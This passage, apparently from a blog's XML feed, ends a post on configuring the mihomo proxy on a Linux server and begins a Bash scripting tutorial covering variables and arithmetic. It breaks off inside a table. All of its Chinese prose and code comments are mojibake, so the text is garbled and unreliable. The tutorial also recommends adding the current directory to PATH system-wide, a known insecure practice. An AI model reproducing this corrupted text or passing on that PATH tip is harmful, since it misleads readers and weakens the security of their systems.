<p>ä½†æ˜¯ä¸å¾—ä¸è¯´ï¼Œå¦‚æœä½ çš„æœåŠ¡å™¨åœ¨å…¬ç½‘ï¼Œé‚£ä¹ˆè¿™æ˜¯ä¸€ä»¶å¾ˆå±é™©çš„äº‹æƒ…ï¼Œå› æ­¤è‡³å°‘éœ€è¦ç»™ä½ çš„ä»£ç†è®¾ç½®å¯†ç ï¼Œä¹Ÿå¯ä»¥ç»‘å®šIPç™½åå•ã€‚</p>
<p>æˆ‘è¯•äº†ä¸€ä¸‹ï¼Œå¦‚æœæ‰‹æœºä¸ç”¨å·¥å…·çš„è¯ä½¿ç”¨ç”¨æˆ·åå¯†ç è®¿é—®ä¸äº†å…¬ç½‘ï¼Œéœ€è¦å®‰è£…ä»£ç†å·¥å…·ã€‚</p>
<h2 id="è¯¦ç»†é…ç½®è¯´æ˜">è¯¦ç»†é…ç½®è¯´æ˜</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ==== æ ¸å¿ƒä»£ç†é…ç½® ====</span></span><br><span class="line"><span class="comment"># æ··åˆä»£ç†ç«¯å£ï¼ˆåŒæ—¶æ”¯æŒ HTTP å’Œ SOCKS5 åè®®ï¼‰</span></span><br><span class="line">mixed-port: 7890  <span class="comment"># å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨/Dockerç­‰ï¼‰é€šè¿‡æ­¤ç«¯å£è¿æ¥ä»£ç†</span></span><br><span class="line"><span class="comment"># æ˜¯å¦å…è®¸å±€åŸŸç½‘å†…å…¶ä»–è®¾å¤‡è¿æ¥ä»£ç†ï¼ˆå¦‚æœæœ¬æœºåœ¨å…¬ç½‘ï¼Œé‚£å°±éƒ½å¯ä»¥è¿æ¥äº†ï¼‰</span></span><br><span class="line">allow-lan: <span class="literal">true</span>   <span class="comment"># true:å…è®¸åŒä¸€å±€åŸŸç½‘è®¾å¤‡ä½¿ç”¨ä»£ç† | false:ä»…æœ¬æœºå¯ç”¨</span></span><br><span class="line"><span class="comment"># ç»‘å®šåœ°å€ï¼ˆ* è¡¨ç¤ºå…è®¸æ‰€æœ‰ç½‘ç»œæ¥å£ï¼ŒåŒ…æ‹¬å…¬ç½‘å’Œæœ¬åœ°ï¼‰</span></span><br><span class="line">bind-address: <span class="string">&#x27;*&#x27;</span># è‹¥éœ€é™åˆ¶è®¿é—®IPï¼Œå¯æ”¹ä¸º 127.0.0.1ï¼ˆä»…æœ¬æœºï¼‰æˆ–ç‰¹å®šIP</span><br><span class="line"><span class="comment"># ä»£ç†æ¨¡å¼ï¼ˆrule:åŸºäºè§„åˆ™åˆ†æµ | global:å…¨å±€ä»£ç† | direct:ç›´è¿ï¼‰</span></span><br><span class="line">mode: rule</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== æ—¥å¿—é…ç½® ====</span></span><br><span class="line"><span class="comment"># æ—¥å¿—çº§åˆ«ï¼ˆdebug/info/warning/error/silentï¼‰</span></span><br><span class="line">log-level: info</span><br><span class="line"><span class="comment"># æ—¥å¿—æ–‡ä»¶è·¯å¾„ï¼ˆéœ€ç¡®ä¿ç›®å½•å­˜åœ¨ä¸” mihomo æœ‰å†™å…¥æƒé™ï¼‰å»ºè®®å®šæœŸæ¸…ç†æˆ–é…ç½® logrotate</span></span><br><span class="line">log-file: /var/log/mihomo.log  <span class="comment">#æ—¥å¿—ä¿å­˜åœ°å€</span></span><br><span class="line"><span class="comment">#è¿œç¨‹è¿æ¥æ—¶ä½¿ç”¨çš„ç”¨æˆ·å’Œå¯†ç ï¼ˆå¯ä»¥å¤šä¸ªï¼‰å¯†ç åŠ¡å¿…é«˜å¼ºåº¦</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== ä»£ç†è®¤è¯é…ç½® ====</span></span><br><span class="line"><span class="comment"># HTTP/SOCKS5 ä»£ç†çš„å®¢æˆ·ç«¯è®¤è¯ï¼ˆéæ§åˆ¶é¢æ¿å¯†ç ï¼‰</span></span><br><span class="line">authentication:</span><br><span class="line">  - <span class="string">&quot;user1:pass1&quot;</span>   <span class="comment"># æ ¼å¼ï¼šç”¨æˆ·å:å¯†ç ï¼ˆå¯é…ç½®å¤šç»„ï¼‰</span></span><br><span class="line">  <span class="comment"># - &quot;user2:pass2&quot;          # å®¢æˆ·ç«¯è¿æ¥éœ€å¡«å†™å¯¹åº”ç”¨æˆ·åå¯†ç </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== æ§åˆ¶é¢æ¿é…ç½® ====</span></span><br><span class="line"><span class="comment"># Web æ§åˆ¶é¢æ¿ç›‘å¬åœ°å€ï¼ˆå¼ºçƒˆå»ºè®®ç»‘å®šåˆ° 127.0.0.1 é¿å…å…¬ç½‘æš´éœ²ï¼‰</span></span><br><span class="line"><span class="comment">#0.0.0.0è¡¨ç¤ºæ‰€æœ‰ipå‡å¯è®¿é—®</span></span><br><span class="line"><span class="comment">#127.0.0.1è¡¨ç¤ºåªæœ‰æœ¬æœºå¯ä»¥è®¿é—®</span></span><br><span class="line">external-controller: <span class="string">&#x27;127.0.0.1:7891&#x27;</span>  </span><br><span class="line">secret: <span class="string">&quot;********&quot;</span>  <span class="comment">#webé¡µé¢å¯†ç ï¼Œè®¿é—® http://IP:7891/ui æ—¶éœ€è¾“å…¥æ­¤å¯†ç ï¼Œå»ºè®®é«˜å¼ºåº¦</span></span><br><span class="line">external-ui: /etc/mihomo/ui <span class="comment"># Web é¢æ¿é™æ€æ–‡ä»¶è·¯å¾„ï¼ˆéœ€ç¡®ä¿ç›®å½•å­˜åœ¨ï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== é«˜çº§ç½‘ç»œé…ç½® ====</span></span><br><span class="line"><span class="comment"># ç»Ÿä¸€å»¶è¿Ÿæµ‹è¯•ï¼ˆtrue:æ‰€æœ‰èŠ‚ç‚¹åŒæ—¶æµ‹é€Ÿ | false:æŒ‰éœ€æµ‹é€Ÿï¼‰</span></span><br><span class="line">unified-delay: <span class="literal">true</span></span><br><span class="line"><span class="comment"># å¯ç”¨ TCP å¹¶å‘è¿æ¥æå‡é€Ÿåº¦ï¼ˆå¯èƒ½å¢åŠ æœåŠ¡å™¨è´Ÿè½½ï¼‰</span></span><br><span class="line">tcp-concurrent: <span class="literal">true</span></span><br><span class="line">dns:</span><br><span class="line">.................</span><br><span class="line">proxies:</span><br><span class="line">.................</span><br><span class="line">ruleï¼š</span><br><span class="line">.................</span><br></pre></td></tr></table></figure>
<h2 id="é‡åˆ°çš„é—®é¢˜ï¼š">é‡åˆ°çš„é—®é¢˜ï¼š</h2>
<ol>
<li class="lvl-3">
<p>ç½‘ä¸Šè¯´mihomoçš„é…ç½®æ–‡ä»¶å’Œclashæ˜¯ä¸€æ ·çš„ï¼Œå› æ­¤è¦æŠŠè®¢é˜…é“¾æ¥è½¬æ¢æˆclashçš„è®¢é˜…é“¾æ¥ï¼Œå¯æ˜¯æˆ‘è½¬æ¢åå¹¶ä¸èƒ½æˆåŠŸä½¿ç”¨ã€‚ç»è¿‡è¿›ä¸€æ­¥çš„äº†è§£å¾—çŸ¥mihomoæ˜¯clash metaçš„æ›´æ–°ï¼Œéšåè½¬æˆmetaé“¾æ¥æˆåŠŸï¼ˆåœ¨è®¢é˜…é“¾æ¥ååŠ <code>&amp;flag=meta</code>ï¼‰ã€‚</p>
</li>
<li class="lvl-3">
<p>ä¸ºdockeræ›´æ¢æºã€ä½¿ç”¨é˜¿é‡ŒåŠ é€Ÿå™¨ã€‚ç„¶è€Œå°è¯•äº†å„ç§æºå‡æ²¡æœ‰ä»€ä¹ˆåµç”¨ï¼Œåªæœ‰ä¸ªåˆ«é•œåƒæ‹‰å–æˆåŠŸï¼Œå¹¶ä¸”å°±ç®—dockeré…ç½®æˆåŠŸäº†ï¼Œæˆ‘è¿˜æ˜¯æ²¡åŠæ³•ç›´æ¥ä¸‹è½½githubçš„èµ„æºã€‚</p>
</li>
<li class="lvl-3">
<p>ä½¿ç”¨clashä»£ç†ï¼Œç„¶è€Œæˆ‘èŠ±å¥½ä¹…ç»ˆäºè¦æ•´å¥½çš„æ—¶å€™ï¼Œclashå¹¶ä¸æ”¯æŒæˆ‘çš„é…ç½®æ–‡ä»¶ä¸­<code>type: hysteria2</code>ï¼Œä¹Ÿå°±æ˜¯ä¸æ”¯æŒhysteria2åè®®ã€‚ä¸€æ—¶é—´æ‰‹è¶³æ— æªï¼Œæœ€ååœ¨ä¸€ç¯‡æ–‡ç« é‡Œçœ‹åˆ°mihomoæ”¯æŒï¼Œæœ€åé…ç½®æˆåŠŸã€‚</p>
</li>
</ol>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<p><a href="https://yeasy.gitbook.io/docker_practice/">Docker â€” ä»å…¥é—¨åˆ°å®è·µ</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€Linuxã€‘shellç¼–ç¨‹</title>
    <url>/posts/63063238/</url>
    <content><![CDATA[<h2 id="shellç¼–ç¨‹">shellç¼–ç¨‹</h2>
<p>è¿™é‡Œè¯´çš„Shell è„šæœ¬ï¼ˆshell scriptï¼‰ï¼Œæ˜¯åœ¨Linux ç¯å¢ƒä¸‹è¿è¡Œçš„è„šæœ¬ç¨‹åº</p>
<p>Shell ç¼–ç¨‹è·Ÿ JavaScriptã€php ç¼–ç¨‹ä¸€æ ·ï¼Œåªè¦æœ‰ä¸€ä¸ªèƒ½ç¼–å†™ä»£ç çš„æ–‡æœ¬ç¼–è¾‘å™¨å’Œä¸€ä¸ªèƒ½è§£é‡Šæ‰§è¡Œçš„è„šæœ¬è§£é‡Šå™¨å°±å¯ä»¥äº†ã€‚</p>
<p>Linux çš„ Shell ç§ç±»ä¼—å¤šï¼Œå¸¸è§çš„æœ‰ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Bourne Shellï¼ˆ/usr/bin/shæˆ–/bin/shï¼‰</p>
</li>
<li class="lvl-2">
<p>Bourne Again Shellï¼ˆ/bin/bashï¼‰</p>
</li>
<li class="lvl-2">
<p>C Shellï¼ˆ/usr/bin/cshï¼‰</p>
</li>
<li class="lvl-2">
<p>K Shellï¼ˆ/usr/bin/kshï¼‰</p>
</li>
<li class="lvl-2">
<p>Shell for Rootï¼ˆ/sbin/shï¼‰</p>
</li>
<li class="lvl-2">
<p>â€¦â€¦</p>
</li>
</ul>
<p>Bashæ˜¯å¤§å¤šæ•°Linux ç³»ç»Ÿé»˜è®¤çš„ Shellï¼Œæœ¬æ–‡ä¹Ÿä»…å…³æ³¨Bash Shellã€‚</p>
<p>åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¹¶ä¸åŒºåˆ† Bourne Shell å’Œ Bourne Again Shellï¼Œæ‰€ä»¥ï¼Œåƒ <strong>#!/bin/sh</strong>ï¼Œå®ƒåŒæ ·ä¹Ÿå¯ä»¥æ”¹ä¸º <strong>#!/bin/bash</strong>ã€‚</p>
<p><strong>#!</strong> å‘Šè¯‰ç³»ç»Ÿå…¶åè·¯å¾„æ‰€æŒ‡å®šçš„ç¨‹åºå³æ˜¯è§£é‡Šæ­¤è„šæœ¬æ–‡ä»¶çš„ Shell ç¨‹åºã€‚</p>
<span id="more"></span>
<h2 id="å…¥é—¨">å…¥é—¨</h2>
<h3 id="è¿è¡ŒShellè„šæœ¬">è¿è¡ŒShellè„šæœ¬</h3>
<p>ç¼–å†™shellè„šæœ¬ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi test.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello World !&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>#!</strong> æ˜¯ä¸€ä¸ªçº¦å®šçš„æ ‡è®°ï¼Œå®ƒå‘Šè¯‰ç³»ç»Ÿè¿™ä¸ªè„šæœ¬éœ€è¦ä»€ä¹ˆè§£é‡Šå™¨æ¥æ‰§è¡Œï¼Œå³ä½¿ç”¨å“ªä¸€ç§ Shellã€‚</p>
<p>echo å‘½ä»¤ç”¨äºå‘çª—å£è¾“å‡ºæ–‡æœ¬ã€‚</p>
<p>è¿è¡Œ Shell è„šæœ¬æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p>
<p><strong>1ã€ä½œä¸ºå¯æ‰§è¡Œç¨‹åº</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x ./test.sh  <span class="comment">#ä½¿è„šæœ¬å…·æœ‰æ‰§è¡Œæƒé™</span></span><br><span class="line">./test.sh  <span class="comment">#æ‰§è¡Œè„šæœ¬</span></span><br></pre></td></tr></table></figure>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€å®šè¦å†™æˆ <strong>./test.sh</strong>ï¼Œè€Œä¸æ˜¯ <strong><a href="http://test.sh">test.sh</a></strong>ï¼Œè¿è¡Œå…¶å®ƒäºŒè¿›åˆ¶çš„ç¨‹åºä¹Ÿä¸€æ ·ã€‚</p>
<p>é™¤éå°†å½“å‰ç›®å½•.åŠ å…¥åˆ°PATHç¯å¢ƒå˜é‡ä¸­ï¼Œé…ç½®æ–¹æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vi /etc/profile</span><br><span class="line">åŠ å…¥ä¸€è¡Œ</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:.</span><br><span class="line">ä¿å­˜ä¹‹åï¼Œæ‰§è¡Œ</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>
<p><strong>2ã€ä½œä¸ºè§£é‡Šå™¨å‚æ•°</strong></p>
<p>ç›´æ¥è¿è¡Œè§£é‡Šå™¨ï¼Œå…¶å‚æ•°å°±æ˜¯ shell è„šæœ¬çš„æ–‡ä»¶åï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/sh test.sh</span><br></pre></td></tr></table></figure>
<p>è¿™ç§æ–¹å¼è¿è¡Œçš„è„šæœ¬ï¼Œä¸éœ€è¦åœ¨ç¬¬ä¸€è¡ŒæŒ‡å®šè§£é‡Šå™¨ä¿¡æ¯ï¼Œå†™äº†ä¹Ÿæ²¡ç”¨ã€‚</p>
<h3 id="ç¼–å†™ä¸€ä¸ªå¿«æ·åˆ›å»ºshellè„šæœ¬çš„å‘½ä»¤">ç¼–å†™ä¸€ä¸ªå¿«æ·åˆ›å»ºshellè„šæœ¬çš„å‘½ä»¤</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -z <span class="variable">$1</span>;<span class="keyword">then</span></span><br><span class="line">  newfile=<span class="string">&quot;./script_`date +%m%d_%s`&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  newfile=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$newfile</span></span><br><span class="line"><span class="keyword">if</span>  ! grep <span class="string">&quot;^#!&quot;</span> <span class="variable">$newfile</span> &amp;&gt;/dev/null; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">cat</span> &gt;&gt; <span class="variable">$newfile</span> &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string"># Author:</span></span><br><span class="line"><span class="string"># Date &amp; Time: `date +&quot;%F %T&quot;`</span></span><br><span class="line"><span class="string">#Description:</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">vim +5 <span class="variable">$newfile</span></span><br><span class="line"><span class="built_in">chmod</span> +x <span class="variable">$newfile</span></span><br></pre></td></tr></table></figure>
<p>å°†ä»¥ä¸Šå†…å®¹ç¼–å†™å¥½ä¹‹åä¿å­˜ä¸ºshellæ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+x shell</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> shell /usr/bin/</span><br></pre></td></tr></table></figure>
<h2 id="Shellå˜é‡">Shellå˜é‡</h2>
<h3 id="å˜é‡ç±»å‹">å˜é‡ç±»å‹</h3>
<p>è¿è¡Œshellæ—¶ï¼Œä¼šåŒæ—¶å­˜åœ¨ä¸‰ç§å˜é‡ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>1) æ™®é€šå˜é‡ï¼ˆå±€éƒ¨å˜é‡ï¼‰</strong>ï¼š ç³»ç»Ÿä¸­æ»¡è¶³ç‰¹å®šè°ƒç”¨éœ€æ±‚çš„é…ç½®ä¿¡æ¯ï¼Œå¹¶ä¸”å¯èƒ½éšæ—¶ä¼šå‘ç”Ÿè°ƒæ•´å˜åŒ–çš„å‚æ•°ã€‚å±€éƒ¨å˜é‡åœ¨è„šæœ¬æˆ–å‘½ä»¤ä¸­å®šä¹‰ï¼Œä»…åœ¨å½“å‰shellå®ä¾‹ä¸­æœ‰æ•ˆï¼Œå…¶ä»–shellå¯åŠ¨çš„ç¨‹åºä¸èƒ½è®¿é—®å±€éƒ¨å˜é‡ã€‚</p>
</li>
<li class="lvl-2">
<p><strong>2) ç¯å¢ƒå˜é‡ï¼ˆå…¨å±€å˜é‡ï¼‰</strong> ï¼šç³»ç»Ÿä¸­é»˜è®¤å·²ç»å­˜åœ¨ï¼Œå¯ä»¥è¿›è¡Œä¿®æ”¹è°ƒæ•´ï¼Œæ‰€æœ‰çš„ç¨‹åºï¼ŒåŒ…æ‹¬shellå¯åŠ¨çš„ç¨‹åºï¼Œéƒ½èƒ½è®¿é—®ç¯å¢ƒå˜é‡ï¼Œæœ‰äº›ç¨‹åºéœ€è¦ç¯å¢ƒå˜é‡æ¥ä¿è¯å…¶æ­£å¸¸è¿è¡Œã€‚å¿…è¦çš„æ—¶å€™shellè„šæœ¬ä¹Ÿå¯ä»¥å®šä¹‰ç¯å¢ƒå˜é‡ã€‚å¯ä»¥åœ¨<code>/etc/profile</code>ä¸­ä¿®æ”¹ç¯å¢ƒå˜é‡ã€‚</p>
</li>
<li class="lvl-2">
<p><strong>3) shellå˜é‡</strong>ï¼š shellå˜é‡æ˜¯ç”±shellç¨‹åºè®¾ç½®çš„ç‰¹æ®Šå˜é‡ã€‚shellå˜é‡ä¸­æœ‰ä¸€éƒ¨åˆ†æ˜¯ç¯å¢ƒå˜é‡ï¼Œæœ‰ä¸€éƒ¨åˆ†æ˜¯å±€éƒ¨å˜é‡ï¼Œè¿™äº›å˜é‡ä¿è¯äº†shellçš„æ­£å¸¸è¿è¡Œ</p>
</li>
</ul>
<p>ç¯å¢ƒå˜é‡ vs æ™®é€šå˜é‡ç‰¹ç‚¹ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>å˜é‡ä¿¡æ¯åœ¨ç³»ç»Ÿä¸­é»˜è®¤å·²ç»å­˜åœ¨</p>
</li>
<li class="lvl-2">
<p>å˜é‡ä¿¡æ¯åç§°è®¾ç½®ä¸ºå¤§å†™å­—æ¯</p>
</li>
<li class="lvl-2">
<p>å˜é‡åŠŸèƒ½é…ç½®å¯¹ç³»ç»Ÿä¸­å…¨éƒ¨ç”¨æˆ·ç”Ÿæ•ˆ</p>
</li>
<li class="lvl-2">
<p>å˜é‡çš„è®¾ç½®ä¼šå¯¹ç³»ç»ŸåŠŸèƒ½æœ‰ä¸€å®šå½±å“</p>
</li>
</ul>
<h3 id="å®šä¹‰å˜é‡">å®šä¹‰å˜é‡</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">your_name=<span class="string">&quot;taobao.com&quot;</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥ç”¨å•å¼•å·ï¼ˆæ‰€è§å³æ‰€å¾—ï¼‰ åŒå¼•å·ï¼ˆå¯ä»¥è¯†åˆ«å˜é‡ï¼‰ åå¼•å·ï¼ˆå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼‰ã€‚ä¸åŠ å¼•å·è¿›è¡Œå˜é‡å€¼å¼•ç”¨ï¼Œæ¨èå­—ç¬¦ç”¨åŒå¼•å· æ•°å­—ä¸åŠ å¼•å·ã€‚</p>
<p>å˜é‡åçš„å‘½åé¡»éµå¾ªå¦‚ä¸‹è§„åˆ™ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>å‘½ååªèƒ½ä½¿ç”¨è‹±æ–‡å­—æ¯ï¼Œæ•°å­—å’Œä¸‹åˆ’çº¿ï¼Œé¦–ä¸ªå­—ç¬¦ä¸èƒ½ä»¥æ•°å­—å¼€å¤´ã€‚</p>
</li>
<li class="lvl-2">
<p>ä¸­é—´ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹åˆ’çº¿ï¼ˆ_ï¼‰ã€‚</p>
</li>
<li class="lvl-2">
<p>ä¸èƒ½ä½¿ç”¨æ ‡ç‚¹ç¬¦å·ã€‚</p>
</li>
<li class="lvl-2">
<p>ä¸èƒ½ä½¿ç”¨bashé‡Œçš„å…³é”®å­—ï¼ˆå¯ç”¨helpå‘½ä»¤æŸ¥çœ‹ä¿ç•™å…³é”®å­—ï¼‰ã€‚</p>
</li>
</ul>
<h3 id="ä½¿ç”¨å˜é‡">ä½¿ç”¨å˜é‡</h3>
<p>åœ¨å˜é‡åå‰é¢åŠ ç¾å…ƒç¬¦å·å³å¯ï¼Œå¦‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">your_name=<span class="string">&quot;qinjx&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$your_name</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;your_name&#125;</span></span><br></pre></td></tr></table></figure>
<p>åŠ èŠ±æ‹¬å·å¯ä»¥å¸®åŠ©è§£é‡Šå™¨è¯†åˆ«å˜é‡çš„è¾¹ç•Œï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> skill <span class="keyword">in</span> Ada Coffe Action Java; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;I am good at <span class="variable">$&#123;skill&#125;</span>Script&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h3 id="åªè¯»å˜é‡">åªè¯»å˜é‡</h3>
<p>ä½¿ç”¨ readonly å‘½ä»¤å¯ä»¥å°†å˜é‡å®šä¹‰ä¸ºåªè¯»å˜é‡ï¼Œåªè¯»å˜é‡çš„å€¼ä¸èƒ½è¢«æ”¹å˜ã€‚</p>
<p>ä¸‹é¢çš„ä¾‹å­å°è¯•æ›´æ”¹åªè¯»å˜é‡ï¼Œç»“æœæŠ¥é”™ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/shell$ myUrl=<span class="string">&quot;http://www.google.com&quot;</span></span><br><span class="line">python@ubuntu:~/shell$ <span class="built_in">readonly</span> myUrl</span><br><span class="line">python@ubuntu:~/shell$ myUrl=<span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line">-bash: myUrl: åªè¯»å˜é‡</span><br></pre></td></tr></table></figure>
<h3 id="åˆ é™¤å˜é‡">åˆ é™¤å˜é‡</h3>
<p>ä½¿ç”¨ unset å‘½ä»¤å¯ä»¥åˆ é™¤å˜é‡ï¼Œä½†ä¸èƒ½åˆ é™¤åªè¯»å˜é‡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">myUrl=<span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line"><span class="built_in">unset</span> myUrl</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$myUrl</span></span><br></pre></td></tr></table></figure>
<h2 id="Shellç®—æœ¯è¿ç®—ç¬¦">Shellç®—æœ¯è¿ç®—ç¬¦</h2>
<p>ä¸‹è¡¨åˆ—å‡ºäº†å¸¸ç”¨çš„ç®—æœ¯è¿ç®—ç¬¦ï¼Œå‡å®šå˜é‡ a ä¸º 10ï¼Œå˜é‡ b ä¸º 20ï¼š</p>
<table>
<thead>
<tr>
<th>è¿ç®—ç¬¦</th>
<th>è¯´æ˜</th>
<th>ä¸¾ä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
<td>+</td>
<td>åŠ æ³•</td>
<td><code>expr $a + $b</code> ç»“æœä¸º 30ã€‚</td>
</tr>
<tr>
<td>-</td>
<td>å‡æ³•</td>
<td><code>expr $a - $b</code> ç»“æœä¸º -10ã€‚</td>
</tr>
<tr>
<td>*</td>
<td>ä¹˜æ³•</td>
<td><code>expr $a \* $b</code> ç»“æœä¸º 200ã€‚\</td>
</tr>
<tr>
<td>**</td>
<td>å¹‚è¿ç®—</td>
<td><code>expr $a ** $b</code></td>
</tr>
<tr>
<td>/</td>
<td>é™¤æ³•</td>
<td><code>expr $b / $a</code> ç»“æœä¸º 2ã€‚</td>
</tr>
<tr>
<td>%</td>
<td>å–ä½™</td>
<td><code>expr $b % $a</code> ç»“æœä¸º 0ã€‚</td>
</tr>
<tr>
<td>=</td>
<td>èµ‹å€¼</td>
<td>a=$b å°†æŠŠå˜é‡ b çš„å€¼èµ‹ç»™ aã€‚</td>
</tr>
<tr>
<td>|</td>
<td>æˆ–</td>
<td>æŒ‰ä½æˆ–</td>
</tr>
<tr>
<td>&amp;</td>
<td>ä¸</td>
<td>æŒ‰ä½ä¸</td>
</tr>
<tr>
<td>^</td>
<td>å¼‚æˆ–</td>
<td>æŒ‰ä½å¼‚æˆ–</td>
</tr>
</tbody>
</table>
<p>shellè„šæœ¬å˜é‡æ•°å€¼è¿ç®—å¯ä»¥ç”¨ä»¥ä¸‹å››ç§æ–¹æ³•</p>
<table>
<thead>
<tr>
<th>å˜é‡å’Œå˜é‡è¿ç®—</th>
<th>å˜é‡å’Œæ•°å€¼è¿ç®—</th>
<th>æ•°å€¼å’Œæ•°å€¼è¿ç®—</th>
</tr>
</thead>
<tbody>
<tr>
<td>sum=$[$a+$b]</td>
<td>a=$[$a+1]</td>
<td>r=$[ 2 * 3 ]</td>
</tr>
<tr>
<td>sum=$(($a+$b))<br>((sum=a+b))</td>
<td>a=$(($a+1))</td>
<td>r=$(( 2 * 3 ))</td>
</tr>
<tr>
<td>sum=`expr $a + $b`</td>
<td>a=`expr $a + 1`</td>
<td>r=`expr 2\ * 3`<br>r=`expr 4/2`</td>
</tr>
<tr>
<td>let sum=a+b</td>
<td>let a=a+1æˆ–<br>let a+=1</td>
<td>let r=2*3</td>
</tr>
</tbody>
</table>
<p>expr æ˜¯ä¸€æ¬¾è¡¨è¾¾å¼è®¡ç®—å·¥å…·ï¼Œä½¿ç”¨å®ƒèƒ½å®Œæˆè¡¨è¾¾å¼çš„æ±‚å€¼æ“ä½œã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">val=`<span class="built_in">expr</span> 2 + 2`</span><br></pre></td></tr></table></figure>
<p>ä¸¤ç‚¹æ³¨æ„ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>è¡¨è¾¾å¼å’Œè¿ç®—ç¬¦ä¹‹é—´è¦æœ‰ç©ºæ ¼ï¼Œä¾‹å¦‚ 2+2 æ˜¯ä¸å¯¹çš„ï¼Œå¿…é¡»å†™æˆ 2 + 2ã€‚</p>
</li>
<li class="lvl-2">
<p>å®Œæ•´çš„è¡¨è¾¾å¼è¦è¢« ` ` åŒ…å«ï¼Œè¿™ä¸ªå­—ç¬¦æ˜¯<strong>åå¼•å·</strong>åœ¨ Esc é”®ä¸‹è¾¹ã€‚</p>
</li>
<li class="lvl-2">
<p>ä¹˜å·(*)å‰è¾¹å¿…é¡»åŠ åæ–œæ <code>\</code>æ‰èƒ½å®ç°ä¹˜æ³•è¿ç®—ï¼›</p>
</li>
<li class="lvl-2">
<p>åœ¨ MAC ä¸­ shell çš„ expr è¯­æ³•æ˜¯ï¼š<strong>$((è¡¨è¾¾å¼))</strong>ï¼Œæ­¤å¤„è¡¨è¾¾å¼ä¸­çš„ â€œ*â€ ä¸éœ€è¦è½¬ä¹‰ç¬¦å· <code>\</code> ã€‚</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">let</span> varName=ç®—æœ¯è¡¨è¾¾å¼</span><br><span class="line">varName=$[ç®—æœ¯è¡¨è¾¾å¼]</span><br><span class="line">varName=$((ç®—æœ¯è¡¨è¾¾å¼))</span><br></pre></td></tr></table></figure>
<h2 id="Shellåˆ¤æ–­è¯­å¥"><strong>Shellåˆ¤æ–­è¯­å¥</strong></h2>
<h3 id="æ¡ä»¶è¯­å¥å½¢å¼"><strong>æ¡ä»¶è¯­å¥å½¢å¼</strong></h3>
<table>
<thead>
<tr>
<th><strong>åºå·</strong></th>
<th style="text-align:center"><strong>è¡¨è¾¾å¼å½¢å¼</strong></th>
<th><strong>ä½¿ç”¨è¯´æ˜</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>01</td>
<td style="text-align:center">[ &lt;æµ‹è¯•è¡¨è¾¾å¼&gt; ]</td>
